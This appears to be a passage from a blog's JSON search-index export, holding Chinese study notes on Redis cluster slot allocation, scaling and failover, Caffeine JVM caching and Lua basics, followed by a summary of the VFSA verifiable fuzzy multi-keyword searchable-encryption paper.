key中不包含“{}”，整个key都是有效部分\n\n例如：key是num，那么就根据num计算，如果是{jianjian}num，则根据jianjian计算。计算方式是利用CRC16算法得到一个hash值，然后对16384取余（CRC16(key) % 16384 ），得到的结果就是slot值。\n\n![](https://img.jwt1399.top/img/202210242304617.png) \n\n如图在7001这个节点执行set a 1时，对a做hash运算，对16384取余，得到的结果15495，因此要存储到7003节点。到了7003后，执行`get num`时，对num做hash运算，对16384取余，得到的结果2765，因此需要切换到7001节点\n\n**总结**\n\nRedis如何判断某个key应该在哪个实例？\n\n- 将16384个插槽分配到不同的实例\n- 根据key的有效部分计算哈希值，对16384取余\n- 余数作为插槽，寻找插槽所在实例即可\n\n如何将同一类数据固定的保存在同一个Redis实例？\n\n- 这一类数据使用相同的有效部分，例如key都以{typeId}为前缀\n\n### ❸集群伸缩\n\nredis-cli --cluster提供了很多操作集群的命令，可以通过下面方式查看：\n\n![](https://img.jwt1399.top/img/202210242319401.png)\n\n#### 1.需求分析\n\n需求：向集群中添加一个新的master节点，并向其中存储 num = 10\n\n- 启动一个新的redis实例，端口为7004\n- 添加7004到之前的集群，并作为一个master节点\n- 给7004节点分配插槽，使得num这个key可以存储到7004实例\n\n这里需要两个新的功能：\n\n- 添加一个节点到集群中\n- 将部分插槽分配到新插槽\n\n#### 2.创建新的redis实例\n\n创建一个文件夹：\n\n```sh\nmkdir 7004\n```\n\n拷贝配置文件：\n\n```sh\ncp redis.conf /7004\n```\n\n修改配置文件：\n\n```sh\nsed /s/6379/7004/g 7004/redis.conf\n```\n\n启动\n\n```sh\nredis-server 7004/redis.conf\n```\n\n#### 3.添加新节点到redis\n\n添加节点的语法如下：\n\n![](https://img.jwt1399.top/img/202210242319022.png)\n\n执行命令：\n\n```sh\nredis-cli --cluster add-node  192.168.150.101:7004 192.168.150.101:7001\n```\n\n通过命令查看集群状态：\n\n```sh\nredis-cli -p 7001 cluster nodes\n```\n\n如图，7004加入了集群，并且默认是一个master节点：\n\n![](https://img.jwt1399.top/img/202210242319028.png)\n\n但是，可以看到7004节点的插槽数量为0，因此没有任何数据可以存储到7004上\n\n#### 4.转移插槽\n\n我们要将num存储到7004节点，因此需要先看看num的插槽是多少：\n\n![](https://img.jwt1399.top/img/202210242320500.png)\n\n如上图所示，num的插槽为2765.\n\n我们可以将0~3000的插槽从7001转移到7004，命令格式如下：\n\n![](https://img.jwt1399.top/img/202210242320657.png)\n\n具体命令如下：\n\n建立连接：\n\n![](https://img.jwt1399.top/img/202210242320294.png)\n\n得到下面的反馈：\n\n![](https://img.jwt1399.top/img/202210242320458.png)\n\n询问要移动多少个插槽，我们计划是3000个：\n\n新的问题来了：\n\n![](https://img.jwt1399.top/img/202210242321392.png)\n\n那个node来接收这些插槽？？\n\n显然是7004，那么7004节点的id是多少呢？\n\n![](https://img.jwt1399.top/img/202210242321252.png)\n\n复制这个id，然后拷贝到刚才的控制台后：\n\n![](https://img.jwt1399.top/img/202210242321161.png)\n\n这里询问，你的插槽是从哪里移动过来的？\n\n- all：代表全部，也就是三个节点各转移一部分\n- 具体的id：目标节点的id\n- done：没有了\n\n这里我们要从7001获取，因此填写7001的id：\n\n![](https://img.jwt1399.top/img/202210242321637.png)\n\n填完后，点击done，这样插槽转移就准备好了：\n\n![](https://img.jwt1399.top/img/202210242322964.png)\n\n确认要转移吗？输入yes：\n\n然后，通过命令查看结果：\n\n![](https://img.jwt1399.top/img/202210242322787.png) \n\n可以看到： \n\n![](https://img.jwt1399.top/img/202210242322766.png)\n\n目的达成。\n\n### ❹故障转移\n\n集群初识状态是这样的：\n\n![](https://img.jwt1399.top/img/202210242313025.png)\n\n其中7001、7002、7003都是master，我们计划让7002宕机。\n\n#### 1.自动故障转移\n\n当集群中有一个master宕机会发生什么呢？直接停止一个redis实例，例如7002：\n\n```sh\nredis-cli -p 7002 shutdown\n```\n\n1）首先是该实例与其它实例失去连接，然后是疑似宕机：\n\n![](https://img.jwt1399.top/img/202210242313432.png)\n\n2）最后是确定下线，自动提升一个slave为新的master：\n\n![](https://img.jwt1399.top/img/202210242313025.png)\n\n3）当7002再次启动，就会变为一个slave节点了：\n\n![](https://img.jwt1399.top/img/202210242313079.png)\n\n#### 2.手动故障转移\n\n利用cluster failover命令可以手动让集群中的某个master宕机，切换到执行cluster failover命令的这个slave节点，实现无感知的数据迁移。其流程如下：\n\n<img src=\"https://img.jwt1399.top/img/202210242314920.png\" style=\"zoom:50%;\" />\n\n\n\n这种failover命令可以指定三种模式：\n\n- 缺省：默认的流程，如图1~6歩\n- force：省略了对offset的一致性校验\n- takeover：直接执行第5歩，忽略数据一致性、忽略master状态和其它master的意见\n\n**案例需求**：在7002这个slave节点执行手动故障转移，重新夺回master地位\n\n- 1）利用redis-cli连接7002这个节点\n\n- 2）执行cluster failover命令\n\n如图：\n\n![](https://img.jwt1399.top/img/202210242314826.png)\n\n效果：\n\n![](https://img.jwt1399.top/img/202210242315932.png)\n\n# 4.多级缓存\n\n## ①什么是多级缓存\n\n**传统缓存策略**一般是请求到达Tomcat后，先查询Redis，如果未命中则查询数据库，存在下面的问题：\n\n- 请求要经过Tomcat处理，Tomcat的性能成为整个系统的瓶颈\n\n- Redis缓存失效时，会对数据库产生冲击\n\n**多级缓存策略**就是充分利用请求处理的每个环节，分别添加缓存，减轻Tomcat压力，提升服务性能：\n\n- 浏览器访问静态资源时，优先读取浏览器本地缓存\n- 访问非静态资源（ajax查询数据）时，访问服务端\n- 请求到达Nginx后，优先读取Nginx本地缓存\n- 如果Nginx本地缓存未命中，则去直接查询Redis（不经过Tomcat）\n- 如果Redis查询未命中，则查询Tomcat\n- 请求进入Tomcat后，优先查询JVM进程缓存\n- 如果JVM进程缓存未命中，则查询数据库\n\n|                       传统缓存                       |                       多级缓存                       |\n| :--------------------------------------------------: | :--------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/202210291820067.png) | ![](https://img.jwt1399.top/img/202210291820697.png) |\n\n在多级缓存架构中，Nginx内部需要编写本地缓存查询、Redis查询、Tomcat查询的业务逻辑，因此这样的nginx服务不再是一个**反向代理服务器**，而是一个编写**业务的Web服务器了**。因此这样的业务Nginx也需要搭建集群来提高并发，再有专门的nginx服务来做反向代理，另外，我们的Tomcat服务将来也会部署为集群模式：\n\n![](https://img.jwt1399.top/img/202210291819191.png)\n\n可见，多级缓存的关键有两个：\n\n- 1.在nginx中编写业务，实现nginx本地缓存、Redis、Tomcat的查询。利用OpenResty框架结合Lua实现\n\n- 2.在Tomcat中实现JVM进程缓存，利用Caffeine框架来实现\n\n## ②JVM进程缓存\n\n### ❶初识Caffeine\n\n缓存在日常开发中启动至关重要的作用，由于是存储在内存中，数据的读取速度是非常快的，能大量减少对数据库的访问，减少数据库的压力。我们把缓存分为两类：\n\n- 分布式缓存，例如Redis：\n  - 优点：存储容量更大、可靠性更好、可以在集群间共享\n  - 缺点：访问缓存有网络开销\n  - 场景：缓存数据量较大、可靠性要求较高、需要在集群间共享\n- 进程本地缓存，例如HashMap、GuavaCache：\n  - 优点：读取本地内存，没有网络开销，速度更快\n  - 缺点：存储容量有限、可靠性较低、无法共享\n  - 场景：性能要求较高，缓存数据量较小\n\n我们利用Caffeine框架来实现JVM进程缓存。**Caffeine**是一个基于Java8开发的，提供了近乎最佳命中率的高性能的本地缓存库。目前Spring内部的缓存使用的就是Caffeine。GitHub地址：https://github.com/ben-manes/caffeine\n\nCaffeine的基本API：\n\n```java\n@Test\nvoid testBasicOps() {\n    // 构建cache对象\n    Cache<String, String> cache = Caffeine.newBuilder().build();\n\n    // 存数据\n    cache.put(\"gf\", \"迪丽热巴\");\n\n    // 取数据\n    String gf = cache.getIfPresent(\"gf\");\n    System.out.println(\"gf = \" + gf);\n\n    // 取数据，包含两个参数：\n    // 参数一：缓存的key\n    // 参数二：Lambda表达式，表达式参数就是缓存的key，方法体是查询数据库的逻辑\n    // 优先根据key查询JVM缓存，如果未命中，则执行参数二的Lambda表达式\n    String defaultGF = cache.get(\"defaultGF\", key -> {\n        // 根据key去数据库查询数据\n        return \"柳岩\";\n    });\n    System.out.println(\"defaultGF = \" + defaultGF);\n}\n```\n\nCaffeine需要有缓存的清除策略，不然的话内存总会有耗尽的时候。Caffeine提供了三种缓存驱逐策略：\n\n- **基于容量**：设置缓存的数量上限\n\n  ```java\n  // 创建缓存对象\n  Cache<String, String> cache = Caffeine.newBuilder()\n      .maximumSize(1) // 设置缓存大小上限为 1\n      .build();\n  ```\n\n- **基于时间**：设置缓存的有效时间\n\n  ```java\n  // 创建缓存对象\n  Cache<String, String> cache = Caffeine.newBuilder()\n      // 设置缓存有效期为 10 秒，从最后一次写入开始计时 \n      .expireAfterWrite(Duration.ofSeconds(10)) \n      .build();\n  \n  ```\n\n- **基于引用**：设置缓存为软引用或弱引用，利用GC来回收缓存数据。性能较差，不建议使用。\n\n> **注意**：在默认情况下，当一个缓存元素过期的时候，Caffeine不会自动立即将其清理和驱逐。而是在一次读或写操作后，或者在空闲时间完成对失效数据的驱逐。\n\n### ❷实现JVM进程缓存\n\n#### 1.需求\n\n利用Caffeine实现下列需求：\n\n- 根据id查询商品的业务添加缓存，缓存未命中时查询数据库\n- 根据id查询库存的业务添加缓存，缓存未命中时查询数据库\n- 缓存初始大小为100\n- 缓存上限为10000\n\n#### 2.实现\n\n首先，我们需要定义两个Caffeine的缓存对象，分别保存商品、库存的缓存数据。\n\n在item-service的`com.heima.item.config`包下定义`CaffeineConfig`类：\n\n```java\npackage com.heima.item.config\n\n@Configuration\npublic class CaffeineConfig {\n\n    @Bean\n    public Cache<Long, Item> itemCache(){\n        return Caffeine.newBuilder()\n                .initialCapacity(100)\n                .maximumSize(10_000)\n                .build();\n    }\n\n    @Bean\n    public Cache<Long, ItemStock> stockCache(){\n        return Caffeine.newBuilder()\n                .initialCapacity(100)\n                .maximumSize(10_000)\n                .build();\n    }\n}\n```\n\n然后，修改item-service中的`com.heima.item.web`包下的ItemController类，添加缓存逻辑：\n\n```java\n@RestController\n@RequestMapping(\"item\")\npublic class ItemController {\n\n    @Autowired\n    private IItemService itemService;\n    @Autowired\n    private IItemStockService stockService;\n\n    @Autowired\n    private Cache<Long, Item> itemCache;\n    @Autowired\n    private Cache<Long, ItemStock> stockCache;\n    \n    // ...其它略\n    \n    @GetMapping(\"/{id}\")\n    public Item findById(@PathVariable(\"id\") Long id) {\n        //根据id查询商品的业务添加缓存，缓存未命中时查询数据库\n        return itemCache.get(id, key -> itemService.query()\n                .ne(\"status\", 3).eq(\"id\", key)\n                .one()\n        );\n    }\n\n    @GetMapping(\"/stock/{id}\")\n    public ItemStock findStockById(@PathVariable(\"id\") Long id) {\n        //根据id查询库存的业务添加缓存，缓存未命中时查询数据库\n        return stockCache.get(id, key -> stockService.getById(key));\n    }\n}\n```\n\n## ③Lua语法入门\n\n### 初识Lua\n\nLua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放， 其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。官网：https://www.lua.org/\n\nLua经常嵌入到C语言开发的程序中，例如游戏开发、游戏插件等。Nginx本身也是C语言开发，因此也允许基于Lua做拓展。\n\n### HelloWorld\n\nCentOS7默认已经安装了Lua语言环境，所以可以直接运行Lua代码。\n\n1）在Linux虚拟机的任意目录下，新建一个hello.lua文件\n\n2）添加下面的内容\n\n```lua\nprint(\"Hello World!\")  \n```\n\n### 变量和循环\n\n#### 1.数据类型\n\nLua中支持的常见数据类型包括：\n\n| 数据类型 | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| nil      | 表示一个无效值（在条件表达式中相当于false）。                |\n| boolean  | 包含两个值：false和true                                      |\n| number   | 表示双精度类型的实浮点数                                     |\n| string   | 字符串由一对双引号或单引号来表示                             |\n| function | 由 C  或 Lua  编写的函数                                     |\n| table    | Lua 中的表（table）其实是一个\"关联数组\"（associative arrays），数组的索引可以是数字、字符串或表类型。在  Lua  里，table  的创建是通过\"构造表达式\"来完成，最简单构造表达式是{}，用来创建一个空表。 |\n\n另外，Lua提供了type()函数来判断一个变量的数据类型：\n\n```lua\n> print(type(\"Hello world\")）\nstring\n> print(type(10.4*3)）\nnumber\n```\n\n#### 2.声明变量\n\nLua声明变量的时候无需指定数据类型，而是用local来声明变量为局部变量：\n\n```lua\n-- 声明字符串，可以用单引号或双引号，\nlocal str = 'hello'\n-- 字符串拼接可以使用 ..\nlocal str2 = 'hello' .. 'world'\n-- 声明数字\nlocal num = 21\n-- 声明布尔类型\nlocal flag = true\n```\n\nLua中的table既可以作为数组，又可以作为Java中的map来使用。数组就是特殊的table，key是数组角标而已：\n\n```lua\n-- 声明数组 ，key为角标的 table\nlocal arr = {'java', 'python', 'lua'}\n-- 声明table，类似java的map\nlocal map =  {name='Jack', age=21}\n```\n\nLua中的数组角标是从1开始，访问的时候与Java中类似：\n\n```lua\n-- 访问数组，lua数组的角标从1开始\nprint(arr[1])\n```\n\nLua中的table可以用key来访问：\n\n```lua\n-- 访问table\nprint(map['name'])\nprint(map.name)\n```\n\n#### 3.循环\n\n对于table，我们可以利用for循环来遍历。不过数组和普通table遍历略有差异。\n\n遍历数组：\n\n```lua\n-- 声明数组 key为索引的table\nlocal arr = {'java', 'python', 'lua'}\n-- 遍历数组\nfor index,value in ipairs(arr) do\n    print(index, value) \nend\n```\n\n遍历普通table\n\n```lua\n-- 声明map，也就是table\nlocal map = {name='Jack', age=21}\n-- 遍历table\nfor key,value in pairs(map) do\n   print(key, value) \nend\n```\n\n### 条件控制、函数\n\n#### 1.函数\n\n定义函数的语法：\n\n```lua\nfunction 函数名(argument1, argument2..., argumentn)\n    -- 函数体\n    return 返回值\nend\n```\n\n例如，定义一个函数，用来打印数组：\n\n```lua\nfunction printArr(arr)\n    for index, value in ipairs(arr) do\n        print(value)\n    end\nend\n```\n\n#### 2.条件控制\n\n类似Java的条件控制，例如if、else语法：\n\n```lua\nif(布尔表达式)\nthen\n   --[ 布尔表达式为 true 时执行该语句块 --]\nelse\n   --[ 布尔表达式为 false 时执行该语句块 --]\nend\n```\n\n与java不同，布尔表达式中的逻辑运算是基于英文单词：\n\n| 操作符 | 描述                                                         | 实例                    |\n| ------ | ------------------------------------------------------------ | ----------------------- |\n| and    | 逻辑与操作符。  若 A 为  false，则返回  A，否则返回  B。     | (A and B) 为  false。   |\n| or     | 逻辑或操作符。  若 A 为  true，则返回  A，否则返回  B。      | (A or B) 为  true。     |\n| not    | 逻辑非操作符。与逻辑运算结果相反，如果条件为  true，逻辑非为  false。 | not(A and B) 为  true。 |\n\n需求：自定义一个函数，可以打印table，当参数为nil时，打印错误信息\n\n```lua\nfunction printArr(arr)\n    if not arr then\n        print('数组不能为空！')\n    end\n    for index, value in ipairs(arr) do\n        print(value)\n    end\nend\n```\n\n## ④实现多级缓存\n\n## ⑤缓存同步\n\n\n\n# 5.MQ高级\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringCloud"],"categories":["Spring"]},{"title":"可搜索加密：VFSA方案","url":"/posts/44711.html","content":"\n**论文名称：《Verifiable Fuzzy Multi-keyword Search over Encrypted Data with Adaptive Security》**\n\n- 作者：童秋云; 苗银斌; 熊健; 刘希萌; 金光·雷蒙德·周; 邓磊\n- 单位：西安电子科技大学\n- 期刊：[IEEE Transactions on Knowledge and Data Engineering](file:///Users/jianjian/Zotero/storage/U5DJKL6D/9714876.html)【CCF A】\n- 时间：2022年02月\n\n|  多关键字  |  模糊搜索  |   可验证   |  动态更新  | 排名 |\n| :--------: | :--------: | :--------: | :--------: | :--: |\n|     ✅      |     ✅      |     ✅      |     ❌      |  ❌   |\n| **正确性** | **完整性** | **安全性** | **复杂度** |      |\n|     ✅      |     ✅      |  IND-CKA2  |  O(log m)  |      |\n\n## 1、方案简介\n\n论文提出了一种具有**自适应安全性的可验证模糊多关键字搜索**（VFSA）方案。VFSA首先采用`局部敏感散列(LSH)`将拼写错误和正确的关键字<u>散列到相同的位置</u>，然后为每个文档设计一个`双布隆过滤器(TBF)`来<u>存储和屏蔽文档中包含的所有关键字</u>，然后`基于图的关键字分区算法(GKP)`构建索引树以实现自适应`亚线性检索`，最后将`Merkle哈希树(MHT)`结构与`自适应的多集累加器(MSA)`相结合，以<u>检查搜索结果的完整性和正确性</u>。通过安全分析表明，VFSA在<u>IND-CKA2</u>模式下是安全的，并实现了查询身份验证。使用真实数据集的实验证明了VFSA的实用性。\n\n- 首先，使用 **LSH** 和 **TBF** 来支持自适应安全的模糊多关键字搜索\n- 然后，使用 **MHT** 和  **GPK** 构造索引树，获得比线性搜索复杂度更快的搜索效果\n- 最后，将 **MHT** 与**MSA**相结合，实现结果的正确性和完整性验证\n\n![](https://img.jwt1399.top/img/202209291228234.png)\n\n## 2、使用技术\n\n| 技术                          | 作用                               |\n| ----------------------------- | ---------------------------------- |\n| 局部敏感散列（LSH）           | 将拼写错误的关键字散列到相同的位置 |\n| 双布隆过滤器（TBF）           | 存储和屏蔽文档中包含的所有关键字   |\n| Merkle哈希树（MHT）           | 正确性和完整性验证                 |\n| 自适应多集累加器（MSA）       | 正确性和完整性验证                 |\n| 基于图的关键字分区算法（GKP） | 提高搜索效率                       |\n\n### ⓵Locality Sensitive Hashing\n\n主要用于高效处理海量高维数据的最近邻问题 ，使得 2 个相似度很高的数据以较高的概率映射成同一个hash 值，而令 2 个相似度很低的数据以极低的概率映射成同一个 hash 值。\n\n------\n\n### ⓶Twin Bloom Filter\n\nTBF 是 BF 的一种扩展的数据结构。具体来说，TBF 是一个有 N 个双胞胎的位数组，其中每个双胞胎包含两个存储相反位的单元。TBF 可以掩盖插入位置和插入元素的数量，即可以同时存储和屏蔽关键字信息，而 BF 则完全暴露它们。TBF 包含四种算法：\n\n![](https://img.jwt1399.top/img/202209272227152.png)\n\n> ❶$Setup(1^λ, k)→ \\{H_{key}, H\\}$\n\nk+1 键控哈希函数 $H_{key}$ 可以使用 HMAC 生成 ，$ h_i(·) =HMAC (K_i, ·) $ ， $K_i$ 是的随机生成的密钥，长度为 λ 。哈希函数 H 可以使用随机预言机 $\\mathbb{H}:\\{0,1\\}^∗→\\{0,1\\}^∗$ 生成，$H =\\mathbb{H}(·)\\%2$\n\n$$\nH_{key} = {h_i：\\{0,1\\}^∗ × \\{0,1\\}^λ → \\{0,1\\}^∗}\n\\\\\\\\\n H：\\{0,1\\}^∗→[0,1]\n$$\n\n> ❷$Initi(N, H_{key}, H, γ)→B$\n\n生成长度为 N 的 TBF，对于每个双胞胎，选择的单元格和未选择的单元格分别初始化为 0 和 1\n$$\nB[ι][H(h_{k+1}(ι)⊕γ)] = 0\n\\\\\\\\\\\nB[ι][1−H(h_{k+1}(ι)⊕γ)] = 1, ι ∈ [1,N]\n$$\nγ 是一个随机数，用于消除不同 TBF 之间的相关性。否则，$B_i$ 和 $B_j$ 中第 $ι$ 个双胞胎选择的单元格是相同的，这降低了随机性，增加了数据暴露的风险\n\n> ❸$Insert(B,  w, H_{key}, H, γ) → B$\n\n对集合 $W$ 中的每个元素 $w$ ，将其散列到 k 个位置 $B[h_1(w)]，····，B[h_k(w)]$，然后对这 k 个位置选中的单元格设置为1，未选中的单元格设置为 0\n$$\nh_i(w) = h_i(w)\\ mod \\ N,i ∈ [1,k]\n\\\\\\\\\nB[h_i(w)][H(h_{k+1}(h_i(w))⊕γ)] = 1\n\\\\\\\\\nB[h_i(w)][1−H(h_{k+1}(h_i(w))⊕γ)] = 0, i∈[1, k]\n$$\n\n> ❹$Check(B, w', γ)→0/1$\n\n为了测试一个元素 $w'$ 是否存储在 $B$ 中，计算并检查下式。如果它对每个 $i ∈ [1,k]$成立，那么 $w'$ 在 B 中\n\n$$\nB[h_i(w')][H(h_{k+1}(h_i(w'))⊕γ)]\\overset{\\text{?}}{=}1\n$$\n\n------\n\n### ⓷Merkle hash tree\n\nMHT 是一个简单而有效的身份验证结构模型，以二叉哈希树的形式呈现。MHT 的叶子节点是真实数据值的哈希值，非叶子节点是左右子节点哈希值的串联。\n$$\nh(h(left \\ child)||h(right \\ child))\n$$\n\n\nMHT 就是用来做完整性校验的， 允许对大规模数据的内容进行高效、安全的验证。但是，MHT有一个节点平衡的缺点，在插入或删除一系列请求后发生。因此，此技术不直接适用于可证明的数据拥有方案。\n\n但是将 MHT 数据结构（Merkle，1980）和双线性聚合签名（Boneh等人，2003）相结合，可以解决 MHT 中的节点平衡问题。当数据所有者决定更新数据块时，她会将新数据块及其身份验证标记发送到云。收到更新请求后，云执行更新操作，重新生成 MHT 的根，更新聚合块标签并返回已签名的根 $sign_{pr} (root)$\n\n![](https://img.jwt1399.top/img/202210301636219.png)\n\n参考：[Merkle Hash Tree | ScienceDirect Topics](https://www.sciencedirect.com/topics/computer-science/merkle-hash-tree)、[双线性配对](https://blog.csdn.net/freedomhero/article/details/124943936?spm=1001.2014.3001.5502)、[双线性配对- BLS 签名](https://blog.csdn.net/freedomhero/article/details/125203129)\n\n------\n\n### ⓸adapted multiset accumulator\n\n自适应多集累加器（MSA）是通过从 CSP 中集合 $T_i$ 得到的，是一种基于双线性对 $(p,\\mathbb{G},\\mathbb{G}_T, e, g)$ 为两个集合 $T_1$ , $T_2$ 的不相交提供简短证明的有效方法。其中$\\mathbb{G}$,$\\mathbb{G}_T$ 是素数阶 $p$ 的两个乘法循环群，$g$ 是 $\\mathbb{G}$ 的生成器，$e：\\mathbb{G}×\\mathbb{G}→\\mathbb{G}_T$ 是一个双线性映射。MSA由以下四种算法组成：©\n\n> ❶$KGen(1^λ)→\\{sk, pk\\}$\n\n随机选择一个元素 $u∈\\mathbb{Z}^*_p$ 作为私钥 $sk$，生成 $g^u$ 作为公钥 $pk$\n\n> ❷$Acc(T_i, sk)→acc_i$\n\n给定集合 $T_i$，$T_i$ 的累积值可计算为 $acc_i=g^{P(T_i)}= g^{r_i∏_{t∈T_i}(t+sk)}$，其中 $r_i$ 是 $\\Z^*_p$ 中的一个随机元素\n\n> ❸$PDisjoint(P(T_1), P(T_2), pk)→π$\n\n如果 $T_1∩T_2=\\varnothing$，则可计算不匹配证明 $π= (pk^{Q_1}, pk^{Q_2})$，根据扩展欧氏算法， $Q_1$、$Q_2$ 是满足 $P(T_1)Q_1+P(T_2)Q_2= 1$ 的两个多项式\n\n> ❹$VDisjoint(acc_1, acc_2, π, sk)→\\{0,1\\}$\n\n$T_1∩T_2=\\varnothing$ 当且仅当 $e(acc_1, pk^{Q_1})·e(acc_2, pk^{Q_2}) =e(g,g)^{sk}$ 成立\n\n------\n\n请注意，CSP无法通过密文$P(T_1)$获得 $T_i$ 和 $sk$。因此，它不能通过伪造累积值来伪造不匹配证明\n\n###  ⓹Graph-based keyword partition \n\n> 索引树中的文档分布对查询效率有很大影响，因为与左右子树都匹配的子查询将导致遍历两个子树。因此，使用基于图的关键字划分算法(GKP)来尽可能减小遍历宽度，其主要思想是最小化左右索引子树中相同关键字的数量\n\n将每个文档 $f_i$ 作为顶点 $v_i$，两个文档 $f_i, f_j$ 相同关键词的个数为 $v_i$ 和 $v_j$ 之间的边的权值 $ω_{i,j}$，DO 构造了一个加权无向图 G 。然后，DO 按照下图的步骤将 $G$ 中的 $m$ 个顶点合并为两个顶点。为了保证索引是一个平衡二叉树，只能合并两个顶点 $v_i$ , $v_j$ 满足 $|v_i|+|v_j|≤⌈m/2⌉$，其中 $|v_i|$ 为顶点 $v_i$ 中包含的文档数量。\n\n![](https://img.jwt1399.top/img/202209292031824.png)\n\n在所有可合并的顶点对中，DO首先选择边权值最大的对 ($v_i$ , $v_j$)，然后将它们合并成一个新的顶点 $v_ρ$，最后更新与之相连的每条边的权值，边权满足 $ω_{ρ，s}≤ω_{i,s}+ω_{s,j}$ 。合并过程不断重复，直到没有两个顶点可以合并为止。在那之后，会发生两种情况\n\n- Case 1：\n\n结果图中只剩下两个顶点。DO 将这两个顶点作为的 $root$ 的左右子树，并将基于图的关键字分区算法分别应用于这两个点中包含的文档子集\n\n- Case 2：\n\n结果图中还剩下三个顶点 $v_{τ_1}, v_{τ_2}, v_{τ_3}$ 。DO 首先找出包含最少文档数量的顶点，然后将顶点中的所有文档重新分配到其他两个顶点。具体而言，我们假设 $|v_{τ_1}|≥|v_{τ_2}|≥|v_{τ_3}|$。对于每个文档 $f_i∈v_{τ_3}$, DO 计算它与 $v_{τ_1}、v_{τ_2}$相同关键字的个数 (表示权重 $ω_{i,τ_1}， ω_{i,τ_2}$) 。在所有这些权重中，DO 选择了最高的一个。假设最大权重 $ω_{i,τ_1}$, DO 比较 $|v_{τ_1}|$ 与$⌈m/2⌉$。如果 $|v_{τ_1}|≤⌈m/2⌉$，DO 将 $f_i$ 合并到$v_{τ_1}$中，重新计算 $v_{τ_3}$ 和 $v_{τ_1}$、$v_{τ_2}$ 中各文档之间的新权重，并重复这个重分配过程。否则，DO会将 $v_{τ_3}$ 中的所有文档合并到 $v_{τ_2}$ 中。\n\n例如，在上图中，我们注意到 $v_7, v_8, v_9$ 中的任何两个顶点都是不可合并的，因为$|v_7|=|v_8|=|v_9|= 2$。在不丧失一般性的情况下，我们取 $v_7$ 为包含文档数量最少的顶点，并假设 $v_7$ 包含文档 $f_1, f_2$。\n\n在 $f_i(i= 1,2)$ 和 $v_8, v_9$ 之间的权重中，我们发现最高的权重是 $ω_{2,9}= 3$。由于$|v_9|= 2<⌈5/2⌉$保持不变，我们将$f_2$ 合并到 $v_9$ 以生成新的顶点 $v_{10}$。之后，在顶点 $v_1、v_8、v_{10}$ 中分别包含1、2、3个文档。虽然最高权值是$ω_{1,10}= 5$，但我们将 $f_1$ 合并到 $v_8$ 中以生成新的顶点 $v_{11}$，因为$|v_{10}|=⌈5/2⌉$。\n\n------\n\n举个🌰：下图是基于GKP的五个文档 $\\{f_1，f_2，f_3，f_4，f_5\\}$ 的索引树构造示例\n\n![](https://img.jwt1399.top/img/202209292030636.png)\n\n**步骤一：**顶点对 $(v_4, v_5)，(v_2, v_3)，(v_2, v_4)$ 具有最高的边权 $ω_{4,5}=ω_{2,3}=ω_{1,3}= 2$，在不丧失一般性的情况下，我们合并 $v_4, v_5$ 以获得一个新的顶点 $v_6$，\n\n**步骤二：**为简便起见，假设 $ω_{ρ,s}=ω_{i,s}+ω_{s,j}$，重新计算与 $v_6$ 相连的每条边的权值\n$$\nω_{1,6}=ω_{1,4} + ω_{1,5} = 0+1= 1\n\\\\\nω_{2,6} =ω_{2,4} +ω_{2,5} =0+1= 1\n\\\\\nω_{3,6} =ω_{3,4} +ω_{3,5} =0+1= 1\n$$\n在新的图中，最大边权值是 $ω_{2,3}=ω_{1,3}= 2$，在不丧失一般性的情况下，我们合并 $v_2, v_3$ 得到一个新的顶点 $v_7$\n\n**步骤三：**当前图由 $v_1、v_6、v_7$ 三个顶点组成，分别包含1、2、2个文档。重新计算权重\n$$\n|v_7|≥|v_6|≥|v_1|\n\\\\\nv_1=\\{f_1\\}=\\{w_1,w_3\\}\\\\\nv_6=\\{f_4,f_5\\}=\\{w_1,w_2,w_4\\}\\\\\nv_7=\\{f_2,f_3\\}=\\{w_1,w_3,w_5\\}\n\\\\\nω_{1,7}= 2， ω_{6,7}= 1\n$$\n由于最高边权值是 $ω_{1,7}= 2$ 和 $|v_1|+|v_7|= 3≤⌈5/2⌉$，我们合并 $v_1, v_7$ 得到一个新的顶点 $v_8$\n\n**步骤四：**最后，我们将 $v_6、v_8$ 作为 $root$ 的左右子树来构建索引树。为了生成基于 GKP 的认证索引树，我们只需要将 $Algorithms \\ 2$ 中的第8-9行替换为 $ID_l,ID_r←GKP(ID)$\n\n## 3、流程概述\n\n> 方案设计了一种自适应安全的模糊多关键字搜索机制。对于每个文档，我们首先使用LSH函数将拼写错误的关键字散列到相同的位置，然后设计一个TBF来存储和屏蔽这些散列值，以在IND-CKA2模型下实现隐私保护的模糊多关键字搜索。在查询阶段实现了比线性搜索复杂度更快的搜索。我们将所有文档的TBF作为叶节点来构建平衡索引树。在构建索引树时，我们使用基于图的关键字划分算法来最小化遍历宽度，从而进一步提高搜索效率。方案实现了正确性和完整性验证。我们首先使用自适应的多集累加器对未返回文档的不相交性和相应的查询关键字生成不匹配证明，以确保不丢失有效结果，然后通过MHT对索引树进行身份验证，以确保索引树中存储的内容不被篡改。\n\n- ⓵首先为每个文档建立索引，然后基于这些索引构建索引树，最后检索包含所有查询关键字的文档。\n\n- ⓶对于自适应安全的模糊多关键字搜索，每个文档的索引是一个 TBF，包含文档中的所有关键字。\n  - 具体来说，方案首先使用 LSH 处理每个关键字，这样拼写错误和正确的关键字就可以散列到相同的 bucket 中。\n  - 然后，方案将这些关键字的 bucket 值存储并屏蔽到 TBF 中，以实现自适应安全。这样，就生成了每个文档的索引。\n\n- ⓷对于比线性搜索复杂度更快的搜索，方案通过将所有文档的索引作为叶节点来构建一个平衡的二叉树作为索引树。\n\n  - 索引树中的每个非叶节点也是一个TBF，由其子节点表示的所有关键字的联合构成。\n  - 如果非叶节点不包含查询关键字，则其子节点肯定不满足查询条件，因此可以修剪以非叶节点为根的子树中存储的文档，以实现次线性检索。\n  - 